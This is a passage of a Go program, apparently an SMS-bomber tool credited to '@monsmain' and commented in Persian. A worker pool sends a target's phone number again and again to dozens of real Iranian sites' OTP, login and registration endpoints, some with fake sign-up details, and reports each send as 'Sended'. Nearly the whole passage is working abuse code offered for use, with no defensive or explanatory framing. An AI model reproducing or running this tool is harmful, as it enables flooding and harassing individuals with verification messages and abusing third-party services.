		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*130)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*130)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {

	// --- اضافه کردن سرویس Telewebion ---
		wg.Add(1) // برای هر درخواست جدید باید Add(1) رو صدا بزنید
		tasks <- func(c *http.Client) func() {
			return func() {
				// ساختار JSON مورد نیاز سرویس Telewebion
				payload := map[string]interface{}{
					"code":      "98",
					"phone":     getPhoneNumberNoZero(phone), // شماره بدون صفر اول
					"smsStatus": "default",
				}
				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
			}
		}(client)
// سرویس tipaxco.com (POST Form Data - ممکن است به پارامترهای داینامیک نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("ctl15$ctl03$ctl01$_txtMobile", phone) // فرمت 09...
				formData.Set("ctl15$ctl03$ctl01$_cbAcceptPrivacyAndPolicy", "on")
				// نکته: این سرویس احتمالاً به پارامترهای داینامیک زیادی مثل __VIEWSTATE و __RequestVerificationToken نیاز دارد که اینجا اضافه نشده‌اند.
				sendFormRequest(c, ctx, "https://tipaxco.com/login", formData, &wg, ch)
			}
		}(client)

		// سرویس api.nikpardakht.com (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":       phone, // فرمت 09...
					"type":         "natural",
					"endPointType": "v1/register",
				}
				sendJSONRequest(c, ctx, "https://api.nikpardakht.com/api/v1/register", payload, &wg, ch)
			}
		}(client)

		// سرویس flytoday.ir/api/collect (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"plaintext": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://www.flytoday.ir/api/collect", payload, &wg, ch)
			}
		}(client)

		// سرویس noornegar.com (POST Form Data - ممکن است به _token نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone) // فرمت 09...
				// نکته: این سرویس احتمالاً به پارامتر _token نیاز دارد که داینامیک است و اینجا مقدار ثابتی ندارد.
				// formData.Set("_token", "مقدار_توکن_داینامیک") // اگر بتوانید توکن را بگیرید اینجا بگذارید
				sendFormRequest(c, ctx, "https://noornegar.com/login-request", formData, &wg, ch)
			}
		}(client)

		// سرویس baziket.com (WP AJAX POST Form Data - ممکن است به csrf نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone) // فرمت 09...
				formData.Set("login", "2")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				// نکته: این سرویس احتمالاً به پارامترهای داینامیک مثل csrf نیاز دارد.
				// formData.Set("csrf", "مقدار_csrf_داینامیک")
				sendFormRequest(c, ctx, "https://baziket.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس api.3click.com (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://api.3click.com/auth/validate", payload, &wg, ch)
			}
		}(client)

		// سرویس dekomaj.com/bakala (POST Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "bakala_send_code")
				formData.Set("phone_email", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://dekomaj.com/bakala/ajax/send_code/", formData, &wg, ch)
			}
		}(client)

		// سرویس hamrah-mechanic.com (POST JSON - شامل پارامترهای اضافی)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"PhoneNumber":    phone, // فرمت 09...
					"prevDomainUrl":  "https://nazarkade.com/",
					"landingPageUrl": "https://www.hamrah-mechanic.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click",
					"orderPageUrl":   "https://www.hamrah-mechanic.com/membersignin/",
					"referrer":       "https://nazarkade.com/",
					"prevUrl":        nil, // یا مقداری که مناسب می‌دانید
				}
				sendJSONRequest(c, ctx, "https://www.hamrah-mechanic.com/api/v1/membership/otp", payload, &wg, ch)
			}
		}(client)

		// سرویس styleup.ir (WP AJAX POST Form Data - فقط بخش send_otp_to_user - ممکن است به nonce نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "verify_user_login")
				formData.Set("fast_ajax", "true")
				formData.Set("user", phone) // فرمت 09...
				formData.Set("duty", "send_otp_to_user")
				// نکته: این سرویس احتمالاً به پارامتر nonce نیاز دارد که داینامیک است.
				// formData.Set("nonce", "مقدار_nonce_داینامیک")
				sendFormRequest(c, ctx, "https://styleup.ir/wp-content/plugins/styleup-login-register_e/include/custom-ajax-handler/ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس fanpooya.com/bakala (POST Form Data - مشابه dekomaj)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "bakala_send_code")
				formData.Set("phone_email", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://fanpooya.com/bakala/ajax/send_code/", formData, &wg, ch)
			}
		}(client)

		// سرویس api.technosun.ir (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"call":   "0",
					"mobile": phone, // فرمت 09...
					"source": "register",
					"type":   "register",
				}
				sendJSONRequest(c, ctx, "https://api.technosun.ir/v1/auth/request-otp", payload, &wg, ch)
			}
		}(client)

		// سرویس nazarkade.com (check.mobile.php POST Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("countryCode", "+98")
				formData.Set("mobile", getPhoneNumberNoZero(phone)) // فرمت 912... بدون صفر
				sendFormRequest(c, ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", formData, &wg, ch)
			}
		}(client)

		// سرویس nazarkade.com (WP AJAX POST Form Data - check_mob - ممکن است به داینامیک ها نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
				// افزودن پارامترهای ثابت یا رایج دیگر
				formData.Set("login", "2")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				formData.Set("digits", "1")
				formData.Set("digregcode", "+98")
				// نکته: این سرویس به پارامترهای داینامیک زیادی مثل csrf نیاز دارد.
				// formData.Set("csrf", "مقدار_csrf_داینامیک")
				// formData.Set("instance_id", "مقدار_instance_id_داینامیک")
				sendFormRequest(c, ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس apigateway.fadaktrains.com (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phoneNumber": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://apigateway.fadaktrains.com/api/auth/otp", payload, &wg, ch)
			}
		}(client)

		// سرویس hoseinifinance.com (POST Form Data با URL Query)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("amzshyar_account_ajax", "true")
				formData.Set("key", "auth")
				formData.Set("level", "first")
				formData.Set("r", "%2F")
				formData.Set("phone", getPhoneNumberNoZero(phone)) // فرمت 912... بدون صفر
				sendFormRequest(c, ctx, "https://hoseinifinance.com/?amzshyar_account_ajax=true", formData, &wg, ch)
			}
		}(client)

		// سرویس toprayan.com (POST Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("Step", "EnterMobile")
				formData.Set("Mobile", phone) // فرمت 09...
				formData.Set("Password", "")     // پارامتر ثابت خالی
				formData.Set("RememberMe", "false")
				formData.Set("VerifyCode", "")   // پارامتر ثابت خالی
				formData.Set("X-Requested-With", "XMLHttpRequest")
				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
			}
		}(client)

		// سرویس iraanbaba.com (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://iraanbaba.com/api/v1/users/check-phone", payload, &wg, ch)
			}
		}(client)


		// سرویس digido.ir (WP AJAX POST Form Data - Register - ممکن است به داینامیک ها نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "register")
				formData.Set("username", phone) // فرمت 09...
				formData.Set("ajax", "1")
				formData.Set("back", "https://digido.ir/?utm_medium=company_profile") // پارامتر ثابت
				// پارامترهای دیگر که ممکن است برای ثبت نام لازم باشند (می‌توانند مقادیر تصادفی یا ثابت باشند)
				formData.Set("firstname", "Test")
				formData.Set("lastname", "User")
				formData.Set("email", "test@example.com") // یا یک ایمیل تصادفی تولید کنید
				formData.Set("password", "Password123")
				// نکته: ممکن است به پارامترهای داینامیک دیگری هم نیاز باشد.
				sendFormRequest(c, ctx, "https://digido.ir/login?back=https%3A%2F%2Fdigido.ir%2F%3Futm_medium%3Dcompany_profile", formData, &wg, ch)
			}
		}(client)


		// سرویس api.faradars.org (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":    phone, // فرمت 09...
					"digits":    5,
					"platforms": "web",
					"source":    "faradars",
				}
				sendJSONRequest(c, ctx, "https://api.faradars.org/api/client/v1/auth/otp", payload, &wg, ch)
			}
		}(client)

		// سرویس api.fidibo.com (POST JSON - فرمت خاص شماره)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"username": "98-" + getPhoneNumberNoZero(phone), // فرمت 98-912...
				}
				sendJSONRequest(c, ctx, "https://api.fidibo.com/identity/login/prepare", payload, &wg, ch)
			}
		}(client)

		// سرویس takdoo.com (WP AJAX POST Form Data - send_otp - ممکن است به nonce نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "ehraz_sms_otp_phone_verify")
				formData.Set("phone_number", phone) // فرمت 09...
				formData.Set("login_method", "code")
				// نکته: این سرویس احتمالاً به پارامتر ehraz_nonce نیاز دارد که داینامیک است.
				// formData.Set("ehraz_nonce", "مقدار_nonce_داینامیک")
				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس ramzinex.com (POST JSON - register_without_password)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"cell_number": phone, // فرمت 09...
					"is_legal":    false,
				}
				sendJSONRequest(c, ctx, "https://ramzinex.com/exchange/api/v1.0/exchange/auth/v4/register_without_password", payload, &wg, ch)
			}
		}(client)

		// سرویس ramzinex.com (GET Query - verification - ممکن است به _rsc نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				// شماره تلفن مستقیماً در URL قرار می‌گیرد (معمولاً بدون صفر اول برای پارامترهای URL)
				urlWithQuery := fmt.Sprintf("https://ramzinex.com/signup/verification/?info=%s", getPhoneNumberNoZero(phone))
				// نکته: این سرویس ممکن است به پارامتر داینامیک _rsc هم در URL نیاز داشته باشد.
				// urlWithQuery = fmt.Sprintf("https://ramzinex.com/signup/verification/?info=%s&_rsc=مقدار_rsc_داینامیک", getPhoneNumberNoZero(phone))
				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
			}
		}(client)

		// سرویس ramzinex.com (POST JSON - send_code/register)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"cell_number": phone, // فرمت 09...
					"ramzinex_client_type": "pwa",
				}
				sendJSONRequest(c, ctx, "https://ramzinex.com/exchange/api/v1.0/exchange/auth/v4/send_code/register", payload, &wg, ch)
			}
		}(client)

		// سرویس oldpanel.avalpardakht.com (POST JSON - Register - شامل پارامترهای اضافی و ممکن است داینامیک باشند)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":            phone, // فرمت 09...
					"email":             "randomuser@example.com", // یا یک ایمیل تصادفی تولید کنید
					"password":          "SecurePass123!", // یا یک رمز تصادفی
					"rules":             true,
					"is_business":       0,
					"online_chat_token": "", // یا مقداری که مناسب می‌دانید
					// نکته: ممکن است به پارامترهای داینامیک بیشتری نیاز باشد.
				}
				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
			}
		}(client)

		// سرویس irancoral.ir (WP AJAX POST Form Data - eh_send_code - ممکن است به nonce نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "eh_send_code")
				formData.Set("phone_number", phone) // فرمت 09...
				formData.Set("login_method", "code")
				// نکته: این سرویس احتمالاً به پارامتر send_nonce نیاز دارد که داینامیک است.
				// formData.Set("send_nonce", "مقدار_nonce_داینامیک")
				sendFormRequest(c, ctx, "https://irancoral.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس sanjagh.pro (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"cell": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell", payload, &wg, ch)
			}
		}(client)

		// سرویس kalazem.com (WP AJAX POST Form Data - Register - شامل پارامترهای اضافی و ممکن است داینامیک باشند)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "register")
				formData.Set("username", phone) // فرمت 09...
				formData.Set("ajax", "1")
				formData.Set("back", "my-account") // پارامتر ثابت
				// پارامترهای دیگر که ممکن است برای ثبت نام لازم باشند (می‌توانند مقادیر تصادفی یا ثابت باشند)
				formData.Set("firstname", "Test")
				formData.Set("lastname", "User")
				formData.Set("password", "Password123")
				// نکته: ممکن است به پارامترهای داینامیک دیگری هم نیاز باشد.
				sendFormRequest(c, ctx, "https://kalazem.com/login?back=my-account", formData, &wg, ch)
			}
		}(client)

		// سرویس ecell.ir (WP AJAX POST Form Data - Register SMS OTP - فرمت خاص شماره و داینامیک)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("phone", formatPhoneWithSpaces(phone)) // فرمت 912 345 6456
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1")
				formData.Set("signup_otp_mode", "1")
				formData.Set("digits", "1")
				formData.Set("digits_form", "fba6016387") // ID فرم
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				formData.Set("digits_reg_name", "Test") // پارامتر ثابت/نمونه
				formData.Set("digits_reg_lastname", "User") // پارامتر ثابت/نمونه
				formData.Set("digt_countrycode", "+98") // کد کشور
				// نکته: این سرویس به پارامترهای داینامیک زیادی مثل instance_id و _wp_http_referer نیاز دارد.
				// formData.Set("instance_id", "مقدار_instance_id_داینامیک")
				// formData.Set("digits_redirect_page", "مقدار_URL_داینامیک")
				// formData.Set("_wp_http_referer", "مقدار_URL_داینامیک")
				sendFormRequest(c, ctx, "https://www.ecell.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس mahamdg.com/bakala (POST Form Data - مشابه dekomaj و fanpooya)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "bakala_send_code")
				formData.Set("phone_email", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://mahamdg.com/bakala/ajax/send_code/", formData, &wg, ch)
			}
		}(client)

		// سرویس oauth.dgland.tech (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"PhoneNumber": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://oauth.dgland.tech/api/otp/generate", payload, &wg, ch)
			}
		}(client)

		// سرویس ketabejam.com (WP AJAX POST Form Data - check_mob - ممکن است به داینامیک ها نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("login", "1") // یا '2' بسته به نیاز سرویس خاص
				formData.Set("digits", "1")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				formData.Set("rememberme", "1")
				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // گاهی هم mobmail استفاده می‌شود
				// نکته: این سرویس به پارامترهای داینامیک مثل csrf، dig_nounce و احتمالا captcha نیاز دارد.
				// formData.Set("csrf", "مقدار_csrf_داینامیک")
				sendFormRequest(c, ctx, "https://ketabejam.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس emersun.com (WP AJAX POST Form Data - login SMS OTP - فرمت خاص شماره و داینامیک)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "login")
				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("login_digt_countrycode", "+98") // کد کشور
				formData.Set("action_type", "phone")
				formData.Set("sms_otp", "")
				formData.Set("digits_otp_field", "1")
				formData.Set("digits", "1")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				// نکته: این سرویس به پارامترهای داینامیک زیادی مثل instance_id نیاز دارد.
				// formData.Set("instance_id", "مقدار_instance_id_داینامیک")
				// formData.Set("digits_redirect_page", "مقدار_URL_داینامیک")
				// formData.Set("_wp_http_referer", "مقدار_URL_داینامیک")
				sendFormRequest(c, ctx, "https://emersun.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس moeinsoft.com (WP AJAX POST Form Data - login SMS OTP - فرمت خاص شماره و داینامیک)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "login")
				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("login_digt_countrycode", "+98") // کد کشور
				formData.Set("action_type", "phone")
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1") // این پارامتر در moeinsoft هم بود
				formData.Set("digits_otp_field", "1")
				formData.Set("rememberme", "1")
				formData.Set("digits", "1")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")
				// نکته: این سرویس به پارامترهای داینامیک زیادی مثل instance_id نیاز دارد.
				// formData.Set("instance_id", "مقدار_instance_id_داینامیک")
				// formData.Set("digits_redirect_page", "مقدار_URL_داینامیک")
				// formData.Set("_wp_http_referer", "مقدار_URL_داینامیک")
				sendFormRequest(c, ctx, "https://moeinsoft.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// سرویس darsman.com (GET Query)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				// شماره تلفن و سایر پارامترها در URL قرار می‌گیرند
				urlWithQuery := fmt.Sprintf("https://darsman.com/Accounting/CheckExistUser?countryCode=0098&mobileNumber=%s&emailAddress=&returnUrl=", url.QueryEscape(getPhoneNumberNoZero(phone))) // فرمت 912... و URL Escape
				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
			}
		}(client)

		// سرویس ketab.land (WP AJAX POST Form Data - check_mob - ممکن است به security نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "voorodak__submit-username")
				formData.Set("username", phone) // فرمت 09...
				// نکته: این سرویس احتمالاً به پارامتر security (nonce) نیاز دارد که داینامیک است.
				// formData.Set("security", "مقدار_security_داینامیک")
				sendFormRequest(c, ctx, "https://ketab.land/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)


		// سرویس etma.ir (POST Form Data - ممکن است به __RequestVerificationToken نیاز داشته باشد)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("name", "8") // پارامتر ثابت
				formData.Set("note", phone) // فرمت 09...
				// نکته: این سرویس به پارامتر __RequestVerificationToken نیاز دارد که داینامیک است.
				// formData.Set("__RequestVerificationToken", "مقدار_توکن_داینامیک")
				sendFormRequest(c, ctx, "https://etma.ir/fa/Account/LaunchTinyNote", formData, &wg, ch)
			}
		}(client)

		// سرویس irangan.com (POST Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone) // فرمت 09...
				formData.Set("email", "")    // پارامتر ثابت خالی
				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
			}
		}(client)
	}

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
